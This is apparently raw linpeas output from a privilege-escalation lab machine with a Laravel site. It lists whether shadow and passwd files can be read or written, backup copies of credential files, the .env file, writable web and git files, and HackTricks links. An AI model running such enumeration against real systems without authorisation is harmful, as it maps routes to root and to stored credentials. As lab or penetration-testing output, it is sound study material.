[+] Permissions in init, init.d, systemd, and rc.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                                                                        
                                                                                  
[+] Hashes inside passwd file? ........... No
[+] Writable passwd file? ................ No                                     
[+] Credentials in fstab/mtab? ........... No                                     
[+] Can I read shadow files? ............. No                                     
[+] Can I read opasswd file? ............. No                                     
[+] Can I write in network-scripts? ...... No                                     
[+] Can I read root folder? .............. No                                     
                                                                                  
[+] Searching root files in home dirs (limit 30)
/home/                                                                            
/home/noulis/.composer
/home/noulis/.composer/keys.tags.pub
/home/noulis/.composer/.htaccess
/home/noulis/.composer/cache
/home/noulis/.composer/cache/files
/home/noulis/.composer/cache/files/mockery
/home/noulis/.composer/cache/files/mockery/mockery
/home/noulis/.composer/cache/files/mockery/mockery/f30d894582b8b548b641819cd37c4cfc11d5b315.zip
/home/noulis/.composer/cache/files/tijsverkoyen
/home/noulis/.composer/cache/files/tijsverkoyen/css-to-inline-styles
/home/noulis/.composer/cache/files/tijsverkoyen/css-to-inline-styles/b52e5b78653e57b3b07937c1f84109ac7f77e5e0.zip
/home/noulis/.composer/cache/files/sebastian
/home/noulis/.composer/cache/files/sebastian/code-unit-reverse-lookup
/home/noulis/.composer/cache/files/sebastian/code-unit-reverse-lookup/9fdb38e356a0265a2dd6b64495413906b9366038.zip
/home/noulis/.composer/cache/files/sebastian/resource-operations
/home/noulis/.composer/cache/files/sebastian/resource-operations/fd2c0f591ee5fee7aa3eb70f20a1d64c1dc26e8d.zip
/home/noulis/.composer/cache/files/sebastian/diff
/home/noulis/.composer/cache/files/sebastian/diff/d845e8b0ee3d707d4b13b9febac4e7a0e8b22fe5.zip
/home/noulis/.composer/cache/files/sebastian/global-state
/home/noulis/.composer/cache/files/sebastian/global-state/a0ef5bf736af85b66572f9ed232aa35c18fe5fb7.zip
/home/noulis/.composer/cache/files/sebastian/exporter
/home/noulis/.composer/cache/files/sebastian/exporter/81e14d73852681aabe5c5a9d8be1ef2045a9170a.zip
/home/noulis/.composer/cache/files/sebastian/comparator
/home/noulis/.composer/cache/files/sebastian/comparator/bdc0b01e0827c360d54386fe60dfc6bd65168f80.zip
/home/noulis/.composer/cache/files/sebastian/version
/home/noulis/.composer/cache/files/sebastian/version/c315a200d32565a6d8ebb3495cb5ae34c5ced3c8.zip
/home/noulis/.composer/cache/files/sebastian/environment
/home/noulis/.composer/cache/files/sebastian/environment/72b70c30c0946406c4562db7b7c647d084a87e12.zip
/home/noulis/.composer/cache/files/sebastian/recursion-context

[+] Searching folders owned by me containing others files on it
                                                                                  
[+] Readable files belonging to root and readable by me but not world readable
                                                                                  
[+] Modified interesting files in the last 5mins (limit 100)
/var/log/syslog                                                                   
/var/log/kern.log
/var/log/auth.log

[+] Writable log files (logrotten) (limit 100)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                                                              
                                                                                  
[+] Files inside /home/www-data (limit 20)
                                                                                  
[+] Files inside others home (limit 20)
/home/noulis/user.txt                                                             
/home/noulis/.bashrc
/home/noulis/.bash_logout
/home/noulis/.profile
/home/noulis/.composer/keys.tags.pub
/home/noulis/.composer/.htaccess
/home/noulis/.composer/cache/files/mockery/mockery/f30d894582b8b548b641819cd37c4cfc11d5b315.zip
/home/noulis/.composer/cache/files/tijsverkoyen/css-to-inline-styles/b52e5b78653e57b3b07937c1f84109ac7f77e5e0.zip
/home/noulis/.composer/cache/files/sebastian/code-unit-reverse-lookup/9fdb38e356a0265a2dd6b64495413906b9366038.zip
/home/noulis/.composer/cache/files/sebastian/resource-operations/fd2c0f591ee5fee7aa3eb70f20a1d64c1dc26e8d.zip
/home/noulis/.composer/cache/files/sebastian/diff/d845e8b0ee3d707d4b13b9febac4e7a0e8b22fe5.zip
/home/noulis/.composer/cache/files/sebastian/global-state/a0ef5bf736af85b66572f9ed232aa35c18fe5fb7.zip
/home/noulis/.composer/cache/files/sebastian/exporter/81e14d73852681aabe5c5a9d8be1ef2045a9170a.zip
/home/noulis/.composer/cache/files/sebastian/comparator/bdc0b01e0827c360d54386fe60dfc6bd65168f80.zip
/home/noulis/.composer/cache/files/sebastian/version/c315a200d32565a6d8ebb3495cb5ae34c5ced3c8.zip
/home/noulis/.composer/cache/files/sebastian/environment/72b70c30c0946406c4562db7b7c647d084a87e12.zip
/home/noulis/.composer/cache/files/sebastian/recursion-context/82276e6cc560a972510bb0c2dc0aa78fa4701777.zip
/home/noulis/.composer/cache/files/sebastian/object-enumerator/d91a189f317ea2b63ee8e5e2431bc67cc35b0468.zip
/home/noulis/.composer/cache/files/nikic/php-parser/f2f709eb0b0befba56b7e0159b9e68a4d9a18afe.zip
/home/noulis/.composer/cache/files/hamcrest/hamcrest-php/d75f61f87d41a4185b72f63a94ca55ed8a49d489.zip
grep: write error: Broken pipe

[+] Searching installed mail applications
                                                                                  
[+] Mails (limit 50)
                                                                                  
[+] Backup folders
drwxr-xr-x 2 root root 4096 May  5 06:25 /var/backups                             
total 756
-rw-r--r-- 1 root root    40960 May  5 06:25 alternatives.tar.0
-rw-r--r-- 1 root root     2152 Mar 23  2017 alternatives.tar.1.gz
-rw-r--r-- 1 root root     7117 Apr  9  2017 apt.extended_states.0
-rw-r--r-- 1 root root      746 Mar 22  2017 apt.extended_states.1.gz
-rw-r--r-- 1 root root       11 Mar 22  2017 dpkg.arch.0
-rw-r--r-- 1 root root       43 Mar 22  2017 dpkg.arch.1.gz
-rw-r--r-- 1 root root      437 Mar 22  2017 dpkg.diversions.0
-rw-r--r-- 1 root root      202 Mar 22  2017 dpkg.diversions.1.gz
-rw-r--r-- 1 root root      207 Mar 22  2017 dpkg.statoverride.0
-rw-r--r-- 1 root root      171 Mar 22  2017 dpkg.statoverride.1.gz
-rw-r--r-- 1 root root   526336 May 10  2022 dpkg.status.0
-rw-r--r-- 1 root root   143460 Mar 22  2017 dpkg.status.1.gz
-rw------- 1 root root      832 Apr  9  2017 group.bak
-rw------- 1 root shadow    699 Apr  9  2017 gshadow.bak
-rw------- 1 root root     1667 Apr  9  2017 passwd.bak
-rw------- 1 root shadow   1191 Apr  9  2017 shadow.bak

drwx------ 2 root root 4096 May 10  2022 /etc/lvm/backup

[+] Backup files
-rw-r--r-- 1 root root 8710 Mar  3  2017 /lib/modules/4.4.0-66-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8990 Mar  3  2017 /lib/modules/4.4.0-66-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 8710 Jan 18  2017 /lib/modules/4.4.0-62-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8990 Jan 18  2017 /lib/modules/4.4.0-62-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 8710 Mar 31  2017 /lib/modules/4.4.0-72-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 8990 Mar 31  2017 /lib/modules/4.4.0-72-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 128 Mar 22  2017 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 20 Feb  9  2017 /etc/vmware-tools/tools.conf.old
-rw-r--r-- 1 root root 673 Mar 22  2017 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 Mar 22  2017 /etc/xml/catalog.old
-rw-r--r-- 1 root root 190058 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/.config.old
-rw-r--r-- 1 root root 0 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Jan 18  2017 /usr/src/linux-headers-4.4.0-62-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 190258 Mar  3  2017 /usr/src/linux-headers-4.4.0-66-generic/.config.old
-rw-r--r-- 1 root root 0 Mar  3  2017 /usr/src/linux-headers-4.4.0-66-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Mar  3  2017 /usr/src/linux-headers-4.4.0-66-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 190247 Mar 31  2017 /usr/src/linux-headers-4.4.0-72-generic/.config.old
-rw-r--r-- 1 root root 0 Mar 31  2017 /usr/src/linux-headers-4.4.0-72-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 0 Mar 31  2017 /usr/src/linux-headers-4.4.0-72-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 31600 Feb  9  2017 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 665 Apr 16  2016 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rwxr-xr-x 1 root root 226 Apr 14  2016 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 11358 Apr  9  2017 /usr/share/info/dir.old

[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
                                                                                  
[+] Web files?(output limit)
/var/www/:                                                                        
total 20K
drwxr-xr-x  5 root     root     4.0K May 10  2022 .
drwxr-xr-x 14 root     root     4.0K May 10  2022 ..
drwxr-xr-x  2 www-data www-data 4.0K May 10  2022 admin
drwxr-xr-x  2 www-data www-data 4.0K May  5 11:07 html
drwxr-xr-x 13 www-data www-data 4.0K May 10  2022 laravel

/var/www/admin:
total 32K

[+] Readable hidden interesting files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                                 
                                                                                  
[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)                                                                             
-rw-r--r-- 1 root root 0 May  5 04:50 /run/network/.ifstate.lock                  
-rw-r--r-- 1 root root 1319 Apr  9  2017 /var/lib/apparmor/profiles/.apparmor.md5sums
-rw-r--r-- 1 www-data www-data 111 Apr  9  2017 /var/www/laravel/.gitattributes
-rw-r--r-- 1 www-data www-data 14 Apr  9  2017 /var/www/laravel/storage/app/public/.gitignore
-rw-r--r-- 1 www-data www-data 23 Apr  9  2017 /var/www/laravel/storage/app/.gitignore
-rw-r--r-- 1 www-data www-data 14 Apr  9  2017 /var/www/laravel/storage/framework/sessions/.gitignore
-rw-r--r-- 1 www-data www-data 103 Apr  9  2017 /var/www/laravel/storage/framework/.gitignore
-rw-r--r-- 1 www-data www-data 14 Apr  9  2017 /var/www/laravel/storage/framework/views/.gitignore
-rw-r--r-- 1 www-data www-data 14 Apr  9  2017 /var/www/laravel/storage/framework/cache/.gitignore
-rw-r--r-- 1 www-data www-data 14 Apr  9  2017 /var/www/laravel/storage/framework/testing/.gitignore
-rw-r--r-- 1 www-data www-data 14 Apr  9  2017 /var/www/laravel/storage/logs/.gitignore
-rw-r--r-- 1 www-data www-data 9 Apr  9  2017 /var/www/laravel/database/.gitignore
-rw-r--r-- 1 www-data www-data 14 Apr  9  2017 /var/www/laravel/bootstrap/cache/.gitignore
-rw-r--r-- 1 www-data www-data 553 Apr  9  2017 /var/www/laravel/public/.htaccess
-rw-r--r-- 1 www-data www-data 117 Apr  9  2017 /var/www/laravel/.gitignore
-rw-r--r-- 1 www-data www-data 572 Apr  9  2017 /var/www/laravel/.env
-rw-r--r-- 1 www-data www-data 14 Feb 28  2017 /var/www/laravel/vendor/mockery/mockery/.styleci.yml
-rw-r--r-- 1 www-data www-data 7 Feb 28  2017 /var/www/laravel/vendor/mockery/mockery/docs/.gitignore
-rw-r--r-- 1 www-data www-data 682 Feb 28  2017 /var/www/laravel/vendor/mockery/mockery/.scrutinizer.yml
-rw-r--r-- 1 www-data www-data 550 Feb 28  2017 /var/www/laravel/vendor/mockery/mockery/.travis.yml
-rw-r--r-- 1 www-data www-data 137 Feb 28  2017 /var/www/laravel/vendor/mockery/mockery/.gitignore
-rw-r--r-- 1 www-data www-data 335 Feb 28  2017 /var/www/laravel/vendor/mockery/mockery/.php_cs
-rw-r--r-- 1 www-data www-data 368 Mar  4  2017 /var/www/laravel/vendor/sebastian/code-unit-reverse-lookup/.travis.yml
-rw-r--r-- 1 www-data www-data 31 Mar  4  2017 /var/www/laravel/vendor/sebastian/code-unit-reverse-lookup/.gitignore
-rw-r--r-- 1 www-data www-data 1937 Mar  4  2017 /var/www/laravel/vendor/sebastian/code-unit-reverse-lookup/.php_cs
-rw-r--r-- 1 www-data www-data 27 Jul 28  2015 /var/www/laravel/vendor/sebastian/resource-operations/.gitignore
-rw-r--r-- 1 www-data www-data 213 Dec  8  2015 /var/www/laravel/vendor/sebastian/diff/.travis.yml
-rw-r--r-- 1 www-data www-data 137 Dec  8  2015 /var/www/laravel/vendor/sebastian/diff/.gitignore
-rw-r--r-- 1 www-data www-data 1903 Dec  8  2015 /var/www/laravel/vendor/sebastian/diff/.php_cs
-rw-r--r-- 1 www-data www-data 246 Oct 12  2015 /var/www/laravel/vendor/sebastian/global-state/.travis.yml
-rw-r--r-- 1 www-data www-data 71 Oct 12  2015 /var/www/laravel/vendor/sebastian/global-state/.gitignore
-rw-r--r-- 1 www-data www-data 350 Nov 19  2016 /var/www/laravel/vendor/sebastian/exporter/.travis.yml
-rw-r--r-- 1 www-data www-data 113 Nov 19  2016 /var/www/laravel/vendor/sebastian/exporter/.gitignore
-rw-r--r-- 1 www-data www-data 406 Jan 29  2017 /var/www/laravel/vendor/sebastian/comparator/.travis.yml
-rw-r--r-- 1 www-data www-data 74 Jan 29  2017 /var/www/laravel/vendor/sebastian/comparator/.gitignore
-rw-r--r-- 1 www-data www-data 15 Oct  3  2016 /var/www/laravel/vendor/sebastian/version/.gitattributes
-rw-r--r-- 1 www-data www-data 7 Oct  3  2016 /var/www/laravel/vendor/sebastian/version/.gitignore
-rw-r--r-- 1 www-data www-data 1919 Oct  3  2016 /var/www/laravel/vendor/sebastian/version/.php_cs
-rw-r--r-- 1 www-data www-data 200 Nov 26  2016 /var/www/laravel/vendor/sebastian/environment/.travis.yml
-rw-r--r-- 1 www-data www-data 45 Nov 26  2016 /var/www/laravel/vendor/sebastian/environment/.gitignore
-rw-r--r-- 1 www-data www-data 280 Nov 19  2016 /var/www/laravel/vendor/sebastian/recursion-context/.travis.yml
-rw-r--r-- 1 www-data www-data 113 Nov 19  2016 /var/www/laravel/vendor/sebastian/recursion-context/.gitignore
-rw-r--r-- 1 www-data www-data 337 Feb 18  2017 /var/www/laravel/vendor/sebastian/object-enumerator/.travis.yml
-rw-r--r-- 1 www-data www-data 101 Feb 18  2017 /var/www/laravel/vendor/sebastian/object-enumerator/.gitignore
-rw-r--r-- 1 www-data www-data 1937 Feb 18  2017 /var/www/laravel/vendor/sebastian/object-enumerator/.php_cs
-rw-r--r-- 1 www-data www-data 640 Mar  5  2017 /var/www/laravel/vendor/nikic/php-parser/.travis.yml
-rw-r--r-- 1 www-data www-data 58 Mar  5  2017 /var/www/laravel/vendor/nikic/php-parser/.gitignore
-rw-r--r-- 1 www-data www-data 18 May 11  2015 /var/www/laravel/vendor/hamcrest/hamcrest-php/.coveralls.yml
-rw-r--r-- 1 www-data www-data 184 May 11  2015 /var/www/laravel/vendor/hamcrest/hamcrest-php/.gush.yml
-rw-r--r-- 1 www-data www-data 358 May 11  2015 /var/www/laravel/vendor/hamcrest/hamcrest-php/.travis.yml
-rw-r--r-- 1 www-data www-data 21 May 11  2015 /var/www/laravel/vendor/hamcrest/hamcrest-php/.gitignore
-rw-r--r-- 1 www-data www-data 1624 Jan 16  2017 /var/www/laravel/vendor/nesbot/carbon/.php_cs.dist
-rw-r--r-- 1 www-data www-data 0 Mar 13  2017 /var/www/laravel/vendor/monolog/monolog/tests/Monolog/Handler/Fixtures/.gitkeep
-rw-r--r-- 1 www-data www-data 1868 Mar 13  2017 /var/www/laravel/vendor/monolog/monolog/.php_cs
-rw-r--r-- 1 www-data www-data 293 Apr 29  2016 /var/www/laravel/vendor/fzaninotto/faker/.travis.yml
-rw-r--r-- 1 www-data www-data 21 Apr 29  2016 /var/www/laravel/vendor/fzaninotto/faker/.gitignore
-rw-r--r-- 1 www-data www-data 201 Apr  8  2014 /var/www/laravel/vendor/jakub-onderka/php-console-color/.travis.yml
-rw-r--r-- 1 www-data www-data 27 Apr  8  2014 /var/www/laravel/vendor/jakub-onderka/php-console-color/.gitignore
-rw-r--r-- 1 www-data www-data 242 Apr 20  2015 /var/www/laravel/vendor/jakub-onderka/php-console-highlighter/.travis.yml
-rw-r--r-- 1 www-data www-data 39 Apr 20  2015 /var/www/laravel/vendor/jakub-onderka/php-console-highlighter/.gitignore
-rw-r--r-- 1 www-data www-data 157 Feb 13  2017 /var/www/laravel/vendor/swiftmailer/swiftmailer/.gitattributes
-rw-r--r-- 1 www-data www-data 589 Feb 13  2017 /var/www/laravel/vendor/swiftmailer/swiftmailer/.travis.yml
-rw-r--r-- 1 www-data www-data 120 Feb 13  2017 /var/www/laravel/vendor/swiftmailer/swiftmailer/.gitignore
-rw-r--r-- 1 www-data www-data 484 Feb 13  2017 /var/www/laravel/vendor/swiftmailer/swiftmailer/.php_cs.dist
-rw-r--r-- 1 www-data www-data 7 Oct 10  2016 /var/www/laravel/vendor/psr/log/.gitignore
-rw-r--r-- 1 www-data www-data 165 Mar 29  2017 /var/www/laravel/vendor/erusev/parsedown/.travis.yml
-rwxr-xr-x 1 www-data www-data 136 Jan 27  2017 /var/www/laravel/vendor/myclabs/deep-copy/.gitattributes
-rwxr-xr-x 1 www-data www-data 723 Jan 27  2017 /var/www/laravel/vendor/myclabs/deep-copy/.travis.yml
-rwxr-xr-x 1 www-data www-data 56 Jan 27  2017 /var/www/laravel/vendor/myclabs/deep-copy/.gitignore
-rw-r--r-- 1 www-data www-data 1169 Jun 15  2015 /var/www/laravel/vendor/doctrine/instantiator/.scrutinizer.yml
grep: write error: Broken pipe

[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                        
-rw-r--r-- 1 root root 43 Mar 22  2017 /var/backups/dpkg.arch.1.gz                
-rw-r--r-- 1 root root 2152 Mar 23  2017 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 root root 202 Mar 22  2017 /var/backups/dpkg.diversions.1.gz
-rw-r--r-- 1 root root 143460 Mar 22  2017 /var/backups/dpkg.status.1.gz
-rw-r--r-- 1 root root 171 Mar 22  2017 /var/backups/dpkg.statoverride.1.gz
-rw-r--r-- 1 root root 526336 May 10  2022 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 207 Mar 22  2017 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 11 Mar 22  2017 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 746 Mar 22  2017 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 40960 May  5 06:25 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 7117 Apr  9  2017 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 437 Mar 22  2017 /var/backups/dpkg.diversions.0

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)                                                                          
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files    
uniq: write error: Broken pipe                                                    
/dev/mqueue
/dev/shm
/run/lock
/run/lock/apache2
/run/screen/S-www-data
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/bind9.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-cronosx2dvg-swap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-dmx2dnamex2dcronosx2dx2dvgx2dswap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2did-dmx2duuidx2dLVMx2dugG31L7SgY5Eq7gNrbTJm4cB1GDM01JlrG31I4305630g1F9wbsXioYxpf3XSPmJ.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-byx2duuid-8562ccf5x2d6b15x2d4c8cx2d965ax2dfaf52bf455a6.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-dmx2d1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mapper-cronosx2dx2dvgx2dswap_1.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ifup@ens160.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-vm-tools.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-systemdx2dfsck.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/tmp
/var/www/admin
/var/www/admin/.welcome.php.swp
/var/www/admin/config.php
/var/www/admin/index.php
/var/www/admin/logout.php
/var/www/admin/session.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html
/var/www/html/1.txt
/var/www/html/index.html
/var/www/html/linpeas.sh
/var/www/laravel
/var/www/laravel/.env
/var/www/laravel/.git
/var/www/laravel/.git/HEAD
/var/www/laravel/.git/branches
/var/www/laravel/.git/config
/var/www/laravel/.git/description
/var/www/laravel/.git/hooks
/var/www/laravel/.git/hooks/applypatch-msg.sample
/var/www/laravel/.git/hooks/commit-msg.sample
/var/www/laravel/.git/hooks/post-update.sample
/var/www/laravel/.git/hooks/pre-applypatch.sample
/var/www/laravel/.git/hooks/pre-commit.sample
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/.git/index
/var/www/laravel/.git/info
/var/www/laravel/.git/info/exclude
/var/www/laravel/.git/logs
/var/www/laravel/.git/logs/HEAD
/var/www/laravel/.git/logs/refs
/var/www/laravel/.git/logs/refs/heads
/var/www/laravel/.git/logs/refs/heads/master
/var/www/laravel/.git/logs/refs/remotes
/var/www/laravel/.git/logs/refs/remotes/origin
/var/www/laravel/.git/logs/refs/remotes/origin/HEAD
/var/www/laravel/.git/objects
/var/www/laravel/.git/objects/info
/var/www/laravel/.git/objects/pack
/var/www/laravel/.git/objects/pack/pack-74fa3b6d97d942c652cea224987f7c73a85e058c.idx
/var/www/laravel/.git/objects/pack/pack-74fa3b6d97d942c652cea224987f7c73a85e058c.pack
/var/www/laravel/.git/packed-refs
/var/www/laravel/.git/refs
/var/www/laravel/.git/refs/heads
/var/www/laravel/.git/refs/heads/master
/var/www/laravel/.git/refs/remotes
/var/www/laravel/.git/refs/remotes/origin
/var/www/laravel/.git/refs/remotes/origin/HEAD
/var/www/laravel/.git/refs/tags
/var/www/laravel/.gitattributes
/var/www/laravel/.gitignore
/var/www/laravel/CHANGELOG.md
/var/www/laravel/app
/var/www/laravel/app/Console
/var/www/laravel/app/Console/Kernel.php
/var/www/laravel/app/Exceptions
/var/www/laravel/app/Exceptions/Handler.php
/var/www/laravel/app/Http
/var/www/laravel/app/Http/Controllers
/var/www/laravel/app/Http/Controllers/Auth
/var/www/laravel/app/Http/Controllers/Auth/ForgotPasswordController.php
/var/www/laravel/app/Http/Controllers/Auth/LoginController.php
/var/www/laravel/app/Http/Controllers/Auth/RegisterController.php
/var/www/laravel/app/Http/Controllers/Auth/ResetPasswordController.php
/var/www/laravel/app/Http/Controllers/Controller.php
/var/www/laravel/app/Http/Kernel.php
/var/www/laravel/app/Http/Middleware
/var/www/laravel/app/Http/Middleware/EncryptCookies.php
/var/www/laravel/app/Http/Middleware/RedirectIfAuthenticated.php
/var/www/laravel/app/Http/Middleware/TrimStrings.php
/var/www/laravel/app/Http/Middleware/VerifyCsrfToken.php
/var/www/laravel/app/Providers
/var/www/laravel/app/Providers/AppServiceProvider.php
/var/www/laravel/app/Providers/AuthServiceProvider.php
/var/www/laravel/app/Providers/BroadcastServiceProvider.php
/var/www/laravel/app/Providers/EventServiceProvider.php
/var/www/laravel/app/Providers/RouteServiceProvider.php
/var/www/laravel/app/User.php
/var/www/laravel/artisan
/var/www/laravel/bootstrap
/var/www/laravel/bootstrap/app.php
/var/www/laravel/bootstrap/autoload.php
/var/www/laravel/bootstrap/cache
/var/www/laravel/bootstrap/cache/.gitignore
/var/www/laravel/bootstrap/cache/services.php
/var/www/laravel/composer.json
/var/www/laravel/composer.lock
/var/www/laravel/composer.phar
/var/www/laravel/config
/var/www/laravel/config/app.php
/var/www/laravel/config/auth.php
/var/www/laravel/config/broadcasting.php
/var/www/laravel/config/cache.php
/var/www/laravel/config/database.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/laravel/database
/var/www/laravel/database/.gitignore
/var/www/laravel/database/factories
/var/www/laravel/database/factories/ModelFactory.php
/var/www/laravel/database/migrations
/var/www/laravel/database/migrations/2014_10_12_000000_create_users_table.php
/var/www/laravel/database/migrations/2014_10_12_100000_create_password_resets_table.php
